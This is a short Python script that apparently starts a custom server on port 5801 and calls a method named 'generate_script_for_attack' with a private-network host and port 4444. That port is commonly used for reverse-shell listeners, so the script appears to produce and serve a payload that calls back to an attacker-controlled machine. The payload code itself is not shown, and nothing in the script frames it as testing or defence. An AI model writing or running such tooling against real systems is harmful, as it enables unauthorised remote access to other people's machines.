
port = 5801
from custom_server import CustomServer 
custom_server = CustomServer(port=port)
custom_server.generate_script_for_attack(host="172.2.2.0",port="4444")
custom_server.start_server()


